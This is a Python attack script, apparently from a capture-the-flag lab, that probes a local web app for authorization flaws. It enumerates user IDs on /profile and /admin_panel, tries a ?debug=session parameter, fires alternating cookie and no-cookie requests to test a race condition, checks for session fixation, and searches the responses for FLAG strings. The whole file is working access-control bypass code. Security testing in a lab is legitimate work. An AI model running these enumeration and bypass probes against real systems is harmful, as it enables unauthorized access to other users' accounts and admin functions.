import requests
import re
import time
import base64

base_url = "http://127.0.0.1:32831"
headers = {"User-Agent": "Security-Tester/1.0"}
session_cookie = "bMFJnxEasCAwKtSQf_pCAgeFx8Amw6DAqDFTsl_gHQY"

print("=" * 80)
print("AUTHORIZATION BYPASS & PRIVILEGE ESCALATION TESTING")
print("=" * 80)

# Test 1: Session ID Pattern Analysis
print("\n[TEST 1] Session ID Pattern Analysis")
print("-" * 80)
session_ids = []
for i in range(5):
    resp = requests.get(f"{base_url}/login", headers=headers, timeout=10)
    session_cookie_new = resp.cookies.get('session')
    if session_cookie_new:
        session_ids.append(session_cookie_new)
        print(f"Session {i+1}: {session_cookie_new}")
        print(f"  Length: {len(session_cookie_new)}")

if len(session_ids) > 1:
    print(f"\n[ANALYSIS] Generated {len(session_ids)} sessions, {len(set(session_ids))} unique")
    if len(set(session_ids)) < len(session_ids):
        print("[!] DUPLICATE SESSIONS DETECTED")

# Test 2: User ID Enumeration (1-50)
print("\n[TEST 2] User ID Enumeration (1-50)")
print("-" * 80)
found_users = []
for user_id in range(1, 51):
    resp = requests.get(
        f"{base_url}/profile?user_id={user_id}",
        headers=headers,
        cookies={"session": session_cookie},
        timeout=5
    )
    
    # Look for admin indicators
    if re.search(r'admin|role|privilege|Administrator', resp.text, re.I):
        print(f"[!] ADMIN INDICATOR at user_id={user_id}")
        print(f"Status: {resp.status_code}")
    
    # Check for valid responses
    if resp.status_code == 200 and len(resp.content) > 100:
        found_users.append((user_id, len(resp.content)))
    
    if user_id % 10 == 0:
        print(f"Progress: Tested {user_id}/50")

print(f"\n[RESULTS] Found {len(found_users)} valid user profiles")

# Test 3: Debug Parameter
print("\n[TEST 3] Debug Parameter Testing")
print("-" * 80)
endpoints = ["/wifi_settings", "/dashboard", "/login", "/server-status"]
for endpoint in endpoints:
    print(f"\n{endpoint}?debug=session")
    resp = requests.get(
        f"{base_url}{endpoint}?debug=session",
        headers=headers,
        cookies={"session": session_cookie},
        timeout=10
    )
    print(f"  Status: {resp.status_code} | Length: {len(resp.content)}B")
    
    if re.search(r'session|user_id|role|admin|debug', resp.text, re.I):
        print("  [!] Debug info found")
        lines = resp.text.split('\n')[:5]
        for line in lines:
            print(f"    {line[:150]}")
    
    flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
    if flag_match:
        print(f"\n[!!!] FLAG FOUND: {flag_match.group()}")

# Test 4: Admin Panel Access
print("\n[TEST 4] Admin Panel Access Tests")
print("-" * 80)
for uid in range(1, 51):
    resp = requests.get(
        f"{base_url}/admin_panel?user_id={uid}",
        headers=headers,
        cookies={"session": session_cookie},
        timeout=5
    )
    
    if resp.status_code == 200 and len(resp.content) > 100:
        print(f"\n[!] ADMIN ACCESS at user_id={uid}")
        print(f"Length: {len(resp.content)}B")
        
        flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
        if flag_match:
            print(f"[!!!] FLAG: {flag_match.group()}")
        
        print(resp.text[:300])
        break

# Test 5: TOCTOU (sequential rapid requests)
print("\n[TEST 5] TOCTOU Race Condition (Sequential)")
print("-" * 80)
success_count = 0
for i in range(30):
    if i % 2 == 0:
        resp = requests.get(f"{base_url}/admin_panel", headers=headers, cookies={"session": session_cookie}, timeout=5)
    else:
        resp = requests.get(f"{base_url}/admin_panel", headers=headers, timeout=5)
    
    if resp.status_code == 200 and len(resp.content) > 500:
        print(f"[!] Request {i} succeeded: {len(resp.content)}B")
        success_count += 1
        
        flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
        if flag_match:
            print(f"\n[!!!] FLAG: {flag_match.group()}")

print(f"TOCTOU results: {success_count} unexpected successes")

# Test 6: Session Fixation
print("\n[TEST 6] Session Fixation Test")
print("-" * 80)
pre_login = requests.get(f"{base_url}/login", headers=headers, timeout=10)
pre_login_session = pre_login.cookies.get('session')
print(f"Pre-login session: {pre_login_session}")

login_resp = requests.post(
    f"{base_url}/login",
    headers=headers,
    data={"username": "test", "password": "test"},
    timeout=10
)
post_login_session = login_resp.cookies.get('session')
print(f"Post-login session: {post_login_session}")

if pre_login_session == post_login_session:
    print("[!] SESSION FIXATION - Session unchanged after login")
else:
    print("[+] Session changed after login")

print("\n[FINISHED] All authorization bypass tests completed")

